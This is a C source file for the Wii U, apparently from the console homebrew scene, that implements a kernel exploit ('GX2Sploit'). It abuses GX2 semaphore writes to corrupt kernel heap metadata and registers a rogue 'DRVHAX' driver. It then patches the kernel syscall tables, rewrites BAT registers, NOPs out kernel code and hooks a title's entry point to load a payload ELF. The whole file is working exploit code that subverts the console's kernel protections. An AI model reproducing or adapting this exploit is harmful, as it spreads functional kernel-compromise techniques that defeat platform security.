#include <coreinit/core.h>
#include <coreinit/memory.h>
#include <coreinit/debug.h>
#include <coreinit/thread.h>
#include <coreinit/cache.h>
#include <coreinit/dynload.h>
#include <coreinit/thread.h>
#include <coreinit/exit.h>
#include <sysapp/launch.h>
#include <gx2/state.h>
#include <coreinit/memorymap.h>
#include <whb/log.h>
#include <malloc.h>
#include <string.h>
#include "elf_abi.h"
#include "elf_loading.h"

#define JIT_ADDRESS			        0x01800000

#define KERN_HEAP				    0xFF200000
#define KERN_HEAP_PHYS			    0x1B800000

#define KERN_SYSCALL_TBL_1          0xFFE84C70 // unknown
#define KERN_SYSCALL_TBL_2          0xFFE85070 // works with games
#define KERN_SYSCALL_TBL_3          0xFFE85470 // works with loader
#define KERN_SYSCALL_TBL_4          0xFFEAAA60 // works with home menu
#define KERN_SYSCALL_TBL_5          0xFFEAAE60 // works with browser (previously KERN_SYSCALL_TBL)

#define KERN_CODE_READ			    0xFFF023D4
#define KERN_CODE_WRITE			    0xFFF023F4
#define KERN_DRVPTR				    0xFFEAB530
#define KERN_ADDRESS_TBL		    0xFFEAB7A0

#define STARTID_OFFSET			    0x08
#define METADATA_OFFSET			    0x14
#define METADATA_SIZE			    0x10

#define BAT_SETUP_HOOK_ADDR         0xFFF1D624
#define BAT_SETUP_HOOK_ENTRY        0x00800000
#define BAT4U_VAL                   0x008000FF
#define BAT4L_VAL                   0x30800012

#define BAT_SET_NOP_ADDR_1          0xFFF06B6C
#define BAT_SET_NOP_ADDR_2          0xFFF06BF8
#define BAT_SET_NOP_ADDR_3          0xFFF003C8
#define BAT_SET_NOP_ADDR_4          0xFFF003CC
#define BAT_SET_NOP_ADDR_5          0xFFF1D70C
#define BAT_SET_NOP_ADDR_6          0xFFF1D728
#define BAT_SET_NOP_ADDR_7          0xFFF1D82C

#define BAT_SET_NOP_ADDR_8          0xFFEE11C4
#define BAT_SET_NOP_ADDR_9          0xFFEE11C8

#define ADDRESS_main_entry_hook                     0x0101c56c
#define ADDRESS_OSTitle_main_entry_ptr              0x1005E040

#define NOP_ADDR(addr) \
        *(uint32_t*)addr = 0x60000000; \
        asm volatile("dcbf 0, %0; icbi 0, %0" : : "r" (addr & ~31));

extern int32_t Register(char *driver_name, uint32_t name_length, void *buf1, void *buf2);
extern void CopyToSaveArea(char *driver_name, uint32_t name_length, void *buffer, uint32_t length);
extern void set_semaphore_phys(uint32_t set_semaphore, uint32_t kpaddr, uint32_t gx2data_addr);

extern void SC0x25_SetupSyscall(void);
extern unsigned int SC0x65_ExploitCheck(unsigned int in);

/* Find a gadget based on a sequence of words */
static void *find_gadget(uint32_t code[], uint32_t length, uint32_t gadgets_start) {
    uint32_t *ptr;

    /* Search code before JIT area first */
    for (ptr = (uint32_t*)gadgets_start; ptr != (uint32_t*)JIT_ADDRESS; ptr++) {
        if (!memcmp(ptr, &code[0], length))
            return ptr;
    }

    OSFatal("Failed to find gadget!");
    return NULL;
}

#ifdef __cplusplus
extern "C" {
#endif

void OSRestartGame(int,char**);

#ifdef __cplusplus
}
#endif

/* Chadderz's kernel write function */
static void __attribute__((noinline)) kern_write(const void *addr, uint32_t value) {
    asm volatile (
        "li 3,1\n"
        "li 4,0\n"
        "mr 5,%1\n"
        "li 6,0\n"
        "li 7,0\n"
        "lis 8,1\n"
        "mr 9,%0\n"
        "mr %1,1\n"
        "li 0,0x3500\n"
        "sc\n"
        "nop\n"
        "mr 1,%1\n"
        :
        :	"r"(addr), "r"(value)
        :	"memory", "ctr", "lr", "0", "3", "4", "5", "6", "7", "8", "9", "10",
        "11", "12"
    );
}

int exploitThread(int argc, char **argv) {
    OSDynLoad_Module gx2_handle;
    OSDynLoad_Acquire("gx2.rpl", &gx2_handle);

    void (*pGX2SetSemaphore)(uint64_t *sem, int action);
    OSDynLoad_FindExport(gx2_handle, 0, "GX2SetSemaphore", (void**)&pGX2SetSemaphore);
    uint32_t set_semaphore = ((uint32_t)pGX2SetSemaphore) + 0x2C;

    uint32_t gx2_init_attributes[9];
    uint8_t *gx2CommandBuffer = (uint8_t*)memalign(0x40, 0x400000);

    gx2_init_attributes[0] = 1;
    gx2_init_attributes[1] = (uint32_t)gx2CommandBuffer;
    gx2_init_attributes[2] = 2;
    gx2_init_attributes[3] = 0x400000;
    gx2_init_attributes[4] = 7;
    gx2_init_attributes[5] = 0;
    gx2_init_attributes[6] = 8;
    gx2_init_attributes[7] = 0;
    gx2_init_attributes[8] = 0;
    GX2Init(gx2_init_attributes); //don't actually know if this is necessary? so temp? (from loadiine or hbl idk)

    /* Allocate space for DRVHAX */
    uint32_t *drvhax = OSAllocFromSystem(0x4c, 4);

    /* Set the kernel heap metadata entry */
    uint32_t *metadata = (uint32_t*) (KERN_HEAP + METADATA_OFFSET + (0x02000000 * METADATA_SIZE));
    metadata[0] = (uint32_t)drvhax;
    metadata[1] = (uint32_t)-0x4c;
    metadata[2] = (uint32_t)-1;
    metadata[3] = (uint32_t)-1;

    /* Find stuff */
    uint32_t gx2data[] = {0xfc2a0000};
    uint32_t gx2data_addr = (uint32_t) find_gadget(gx2data, 0x04, 0x10000000);
    uint32_t doflush[] = {0xba810008, 0x8001003c, 0x7c0803a6, 0x38210038, 0x4e800020, 0x9421ffe0, 0xbf61000c, 0x7c0802a6, 0x7c7e1b78, 0x7c9f2378, 0x90010024};
    void (*do_flush)(uint32_t arg0, uint32_t arg1) = find_gadget(doflush, 0x2C, 0x01000000) + 0x14;

    /* Modify a next ptr on the heap */
    uint32_t kpaddr = KERN_HEAP_PHYS + STARTID_OFFSET;

    set_semaphore_phys(set_semaphore, kpaddr, gx2data_addr);
    set_semaphore_phys(set_semaphore, kpaddr, gx2data_addr);
    do_flush(0x100, 1);

    /* Register a new OSDriver, DRVHAX */
    char drvname[6] = {'D', 'R', 'V', 'H', 'A', 'X'};
    Register(drvname, 6, NULL, NULL);

    /* Use DRVHAX to install the read and write syscalls */
    uint32_t syscalls[2] = {KERN_CODE_READ, KERN_CODE_WRITE};

    DCFlushRange(syscalls, 0x04*2);

    /* Modify its save area to point to the kernel syscall table */
    drvhax[0x44/4] = KERN_SYSCALL_TBL_1 + (0x34 * 4);
    CopyToSaveArea(drvname, 6, syscalls, 8);
    drvhax[0x44/4] = KERN_SYSCALL_TBL_2 + (0x34 * 4);
    CopyToSaveArea(drvname, 6, syscalls, 8);
    drvhax[0x44/4] = KERN_SYSCALL_TBL_3 + (0x34 * 4);
    CopyToSaveArea(drvname, 6, syscalls, 8);
    drvhax[0x44/4] = KERN_SYSCALL_TBL_4 + (0x34 * 4);
    CopyToSaveArea(drvname, 6, syscalls, 8);
    drvhax[0x44/4] = KERN_SYSCALL_TBL_5 + (0x34 * 4);
    CopyToSaveArea(drvname, 6, syscalls, 8);

    /* Clean up the heap and driver list so we can exit */
    kern_write((void*)(KERN_HEAP + STARTID_OFFSET), 0);
    kern_write((void*)KERN_DRVPTR, drvhax[0x48/4]);

    /* Setup kernel memmap for further exploitation (will be reverted later) */
    kern_write((void*)(KERN_ADDRESS_TBL + 0x12 * 4), 0x10000000);
    kern_write((void*)(KERN_ADDRESS_TBL + 0x13 * 4), 0x28305800);

    /* clean shutdown */
    GX2Shutdown();
    free(gx2CommandBuffer);
    return 0;
}

static void setup_syscall(void) {
    // set kernel code area write permissions
    asm volatile("mtspr 570, %0" : : "r" (0xFFF00002));
    asm volatile("mtspr 571, %0" : : "r" (0xFFF00032));
    asm volatile("eieio; isync");

    uint32_t *targetAddress = (uint32_t*)BAT_SETUP_HOOK_ADDR;
    targetAddress[0] = 0x3ce00000 | ((BAT4L_VAL >> 16) & 0xFFFF);   // lis r7, BAT4L_VAL@h
    targetAddress[1] = 0x60e70000 | (BAT4L_VAL & 0xFFFF);           // ori r7, r7, BAT4L_VAL@l
    targetAddress[2] = 0x7cf18ba6;                                  // mtspr 561, r7
    targetAddress[3] = 0x3ce00000 | ((BAT4U_VAL >> 16) & 0xFFFF);   // lis r7, BAT4U_VAL@h
    targetAddress[4] = 0x60e70000 | (BAT4U_VAL & 0xFFFF);           // ori r7, r7, BAT4U_VAL@l
    targetAddress[5] = 0x7cf08ba6;                                  // mtspr 560, r7
    targetAddress[6] = 0x7c0006ac;                                  // eieio
    targetAddress[7] = 0x4c00012c;                                  // isync
    targetAddress[8] = 0x7ce802a6;                                  // mflr r7
    targetAddress[9] = 0x48000003 | (uint32_t)BAT_SETUP_HOOK_ENTRY;      // bla BAT_SETUP_HOOK_ENTRY
    asm volatile("dcbf 0, %0; icbi 0, %0; sync" : : "r" (BAT_SETUP_HOOK_ADDR & ~31));
    asm volatile("dcbf 0, %0; icbi 0, %0; sync" : : "r" ((BAT_SETUP_HOOK_ADDR + 0x20) & ~31));

    NOP_ADDR(BAT_SET_NOP_ADDR_1);
    NOP_ADDR(BAT_SET_NOP_ADDR_2);
    NOP_ADDR(BAT_SET_NOP_ADDR_3);
    NOP_ADDR(BAT_SET_NOP_ADDR_4);
    NOP_ADDR(BAT_SET_NOP_ADDR_5);
    NOP_ADDR(BAT_SET_NOP_ADDR_6);
    NOP_ADDR(BAT_SET_NOP_ADDR_7);

    asm volatile("eieio; isync");
    asm volatile("mtspr 570, %0" : : "r" (0xFFEE0002));
    asm volatile("mtspr 571, %0" : : "r" (0xFFEE0032));
    asm volatile("eieio; isync");

    NOP_ADDR(BAT_SET_NOP_ADDR_8);
    NOP_ADDR(BAT_SET_NOP_ADDR_9);

    asm volatile("sync; eieio; isync");
    asm volatile("mtspr 560, %0" : : "r" (BAT4U_VAL));
    asm volatile("mtspr 561, %0" : : "r" (BAT4L_VAL));
    asm volatile("mtspr 570, %0" : : "r" (BAT4U_VAL));
    asm volatile("mtspr 571, %0" : : "r" (BAT4L_VAL));
    asm volatile("eieio; isync");
}

int CheckKernelExploit(void) {
    if(OSEffectiveToPhysical(0xA0000000) == 0x10000000) {
        WHBLogPrintf("Running kernel setup");

        unsigned char backupBuffer[0x40];

        uint32_t *targetAddress = (uint32_t*)(0xA0000000 + (0x327FF000 - 0x10000000));
        memcpy(backupBuffer, targetAddress, sizeof(backupBuffer));

        targetAddress[0] = 0x7c7082a6;                          // mfspr r3, 528
        targetAddress[1] = 0x60630003;                          // ori r3, r3, 0x03
        targetAddress[2] = 0x7c7083a6;                          // mtspr 528, r3
        targetAddress[3] = 0x7c7282a6;                          // mfspr r3, 530
        targetAddress[4] = 0x60630003;                          // ori r3, r3, 0x03
        targetAddress[5] = 0x7c7283a6;                          // mtspr 530, r3
        targetAddress[6] = 0x7c0006ac;                          // eieio
        targetAddress[7] = 0x4c00012c;                          // isync
        targetAddress[8] = 0x3c600000 | (((uint32_t)setup_syscall) >> 16);     // lis r3, setup_syscall@h
        targetAddress[9] = 0x60630000 | (((uint32_t)setup_syscall) & 0xFFFF);  // ori r3, r3, setup_syscall@l
        targetAddress[10] = 0x7c6903a6;                         // mtctr   r3
        targetAddress[11] = 0x4e800420;                         // bctr
        DCFlushRange(targetAddress, sizeof(backupBuffer));

        uint8_t *hookAddress = (uint8_t*)(0xA0000000 + (0x30000000 - 0x10000000));

        uint32_t entryPoint = load_loader_elf(hookAddress, "wiiu/hook_payload.elf");

        /* set our setup syscall to an unused position */
        kern_write((void*)(KERN_SYSCALL_TBL_1 + (0x25 * 4)), 0x017FF000);
        kern_write((void*)(KERN_SYSCALL_TBL_2 + (0x25 * 4)), 0x017FF000);
        kern_write((void*)(KERN_SYSCALL_TBL_3 + (0x25 * 4)), 0x017FF000);
        kern_write((void*)(KERN_SYSCALL_TBL_4 + (0x25 * 4)), 0x017FF000);
        kern_write((void*)(KERN_SYSCALL_TBL_5 + (0x25 * 4)), 0x017FF000);

        /* run our kernel code :) */
        SC0x25_SetupSyscall();

        /* revert setup syscall */
        kern_write((void*)(KERN_SYSCALL_TBL_1 + (0x25 * 4)), 0x0);
        kern_write((void*)(KERN_SYSCALL_TBL_2 + (0x25 * 4)), 0x0);
        kern_write((void*)(KERN_SYSCALL_TBL_3 + (0x25 * 4)), 0x0);
        kern_write((void*)(KERN_SYSCALL_TBL_4 + (0x25 * 4)), 0x0);
        kern_write((void*)(KERN_SYSCALL_TBL_5 + (0x25 * 4)), 0x0);

        /* repair data */
        memcpy(targetAddress, backupBuffer, sizeof(backupBuffer));
        DCFlushRange(targetAddress, sizeof(backupBuffer));

        unsigned int repl_addr = ADDRESS_main_entry_hook;
        *(uint32_t*)(0xC1000000 + repl_addr) = 0x48000003 | entryPoint;
        DCFlushRange((void*)0xC1000000 + repl_addr, 4);
        ICInvalidateRange((void*)(repl_addr), 4);

        /* restore kernel memory table to original state */
        kern_write((void*)(KERN_ADDRESS_TBL + (0x12 * 4)), 0);
        kern_write((void*)(KERN_ADDRESS_TBL + (0x13 * 4)), 0x14000000);

        WHBLogPrintf("Kernel setup finished");
        return 1;
    } else {
        WHBLogPrintf("Running GX2Sploit");
        /* Make a thread to modify the semaphore */
        OSThread *thread = (OSThread*)memalign(8, 0x1000);
        uint8_t *stack = (uint8_t*)memalign(0x40, 0x2000);

        if (OSCreateThread(thread, (OSThreadEntryPointFn)exploitThread, 0, NULL, stack + 0x2000, 0x2000, 0, 0x1) == 0) {
            OSFatal("Failed to create thread");
        }

        OSResumeThread(thread);
        OSJoinThread(thread, 0);
        free(thread);
        free(stack);

        WHBLogPrintf("GX2Sploit done");
        return 0;
    }

    // else everything is setup
    return 1;
}
